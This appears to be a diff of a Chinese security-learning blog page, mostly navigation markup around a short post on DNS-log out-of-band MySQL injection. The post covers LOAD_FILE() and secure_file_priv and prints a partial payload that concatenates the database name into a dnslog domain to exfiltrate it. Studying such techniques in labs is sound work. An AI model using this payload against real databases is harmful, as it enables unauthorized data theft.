@@ -10,7 +10,7 @@
     
     
     
-    <title>tags: 数据库注入--Access注入 | 伏诗</title>
+    <title>Mysql注入--DNS注入 | 伏诗</title>
     <link href="http://wxnsoul.github.io" rel="prefetch" />
 
     
@@ -153,7 +153,7 @@
                         </li>
                         
                         <li>
-                            <a href="/categories/SQL-DDL/">SQL-DDL</a>
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入绕过姿势</a>
                         </li>
                         
                         
@@ -183,11 +183,11 @@
                         </li>
                         
                         <li>
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                            <a href="/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
                         </li>
                         
                         <li>
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
                         </li>
                         
                         
@@ -217,19 +217,34 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-tag">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="http://wxnsoul.github.io">伏诗</a>
         >
-        <span>标签</span>
+        <span>Mysql注入--DNS注入</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/index.html">数据库注入--Access注入</a>
+                <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">数据库注入--DNS注入原理</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2020-04-05
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -237,21 +252,41 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/index.html">数据库注入--Access注入</a>
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2020-04-05
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">数据库注入--DNS注入原理</a>
+                
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-            <a href="/2020/04/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/">数据库注入--Access注入</a>
-            <br>
-            
-            
-        </div>
+    <div class="content-article">
+        <h1 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h1><ul>
+<li>通过dnslog(日志)把盲注变成有显错注入</li>
+</ul>
+<h1 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h1><ul>
+<li>LOAD_FILE()读取文件的函数<br><br>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的<br>文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_ allowed_ _packet (限制server<br>接受的数据包大小函数，默认1MB)。如果该文件不存在或无法读取，因为前面的条件之一不满足， 函数返回NULL。<br><br>这个功能不是默认开启的，需要在mysq|配置文件加一-句secure_file_priv=<br><br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200405/ltmx8W6kfjBp.png?imageslim" alt="mark">)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200405/jo3LwugH4mzt.png?imageslim" alt="mark"><br><br>效果图:<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200405/ptXkI6hGdIau.png?imageslim" alt="mark"></li>
+</ul>
+<h1 id="Apache特性"><a href="#Apache特性" class="headerlink" title="Apache特性"></a>Apache特性</h1><ul>
+<li>当apache解析域名碰到不认识的东西时就会往前解析.所以当被拦截时就可以加一些不认识的东西让他去解析,比如1.txt<br>and concat(“//”,select database(),”wdis.dnslog”) – wq<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200405/2VtodBtleXVp.png?imageslim" alt="mark">)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200405/2VtodBtleXVp.png?imageslim" alt="mark">就可以把通过把库名拼接到dnslog上进行查看,但是只能拼接一条语句,所以只能用limit来限制</li>
+</ul>
+<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><ul>
+<li>传送地址:</li>
+</ul>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -308,6 +343,18 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2020/04/05/DNS%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">DNS注入--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2020/04/05/access%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA2/">access注入--zkaq靶场2</a>
                 </span>
             </li>
@@ -354,18 +401,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/04/%E7%9B%B2%E6%B3%A8-zkaq%E9%9D%B6%E5%9C%BA/">盲注--zkaq靶场</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">SQL注入--盲注</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -384,7 +419,19 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                    <a href="/2020/04/05/DNS%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">DNS注入--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">SQL注入--盲注</a>
                 </span>
             </li>
             
@@ -396,19 +443,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E5%AD%90%E6%9F%A5%E8%AF%A2/">SQL语句--子查询</a>
+                    <a href="/2020/04/03/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8AGet%E6%B3%A8%E5%85%A5/">SQL注入--原理分析以及Get注入</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入绕过姿势</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/">SQL语句--聚合函数</a>
+                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E7%A9%BA%E5%80%BC%E5%8F%8A%E5%85%B6%E5%A4%84%E7%90%86/">SQL语句--空值及其处理</a>
                 </span>
             </li>
             
@@ -420,7 +461,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/%E5%85%B3%E4%BA%8Emarkdown2/">关于markdown2</a>
+                    <a href="/2020/04/01/zkaq-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">zkaq--序列化与反序列化</a>
                 </span>
             </li>
             
@@ -436,12 +477,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/05/%E8%A7%A3%E5%86%B3tags%E5%92%8Ccategories%E7%82%B9%E5%87%BB%E5%90%8E%E9%A1%B5%E9%9D%A2%E4%B8%BA%E7%A9%BA%E7%9A%84%E9%97%AE%E9%A2%98/">解决tags和categories点击后页面为空的问题</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -453,17 +488,17 @@
 
                 
                 <li>
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
@@ -471,33 +506,37 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 16.33938961270551px;" class="tag-cloud-link">SQL注入--Get注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 8.223407990244418px;" class="tag-cloud-link">SQL注入--Get注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 9.929758304925723px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
+    <a href="/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/" style="font-size: 9.95146072980759px;" class="tag-cloud-link">Mysql注入--DNS注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 9.370794091312584px;" class="tag-cloud-link">SQL注入--POST注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 19.05147758861846px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" style="font-size: 17.61460920258554px;" class="tag-cloud-link">SQL注入--盲注</a>
+    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 11.728269893226887px;" class="tag-cloud-link">数据库注入--DNS注入原理</a>
     
-    <a href="/tags/SQL-DDL/" style="font-size: 14.439482234008018px;" class="tag-cloud-link">SQL-DDL</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 8.905400345680203px;" class="tag-cloud-link">SQL注入--POST注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" style="font-size: 13.055011538807292px;" class="tag-cloud-link">SQL注入绕过姿势</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" style="font-size: 10.808389286632588px;" class="tag-cloud-link">SQL注入--盲注</a>
     
-    <a href="/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/" style="font-size: 16.465062145880864px;" class="tag-cloud-link">Access注入--cookie注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" style="font-size: 17.976199606894173px;" class="tag-cloud-link">SQL注入绕过姿势</a>
     
-    <a href="/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" style="font-size: 17.86640651465081px;" class="tag-cloud-link">Access注入--偏移注入</a>
+    <a href="/tags/SQL-DDL/" style="font-size: 14.436408138615347px;" class="tag-cloud-link">SQL-DDL</a>
     
-    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 19.003912755339194px;" class="tag-cloud-link">web通信原理</a>
+    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 13.90642758242361px;" class="tag-cloud-link">web通信原理</a>
     
-    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 13.565581280756529px;" class="tag-cloud-link">web前端安全基础</a>
+    <a href="/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" style="font-size: 13.800852130510819px;" class="tag-cloud-link">Access注入--偏移注入</a>
     
-    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15.506941179020643px;" class="tag-cloud-link">序列化与反序列化</a>
+    <a href="/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/" style="font-size: 10.141523110310226px;" class="tag-cloud-link">Access注入--cookie注入</a>
     
-    <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 19.77915646419079px;" class="tag-cloud-link">正则表达式</a>
+    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 8.575043228469902px;" class="tag-cloud-link">web前端安全基础</a>
     
-    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 14.90843169419772px;" class="tag-cloud-link">博客学习</a>
+    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 19.629720475235924px;" class="tag-cloud-link">序列化与反序列化</a>
     
-    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5/" style="font-size: 19.912924174494847px;" class="tag-cloud-link">数据库注入--Access注入</a>
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 11.842307539535994px;" class="tag-cloud-link">博客学习</a>
+    
+    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 10.222247398674233px;" class="tag-cloud-link">数据库注入--Access注入原理</a>
+    
+    <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 9.43605238309582px;" class="tag-cloud-link">正则表达式</a>
     
 </div>
                 
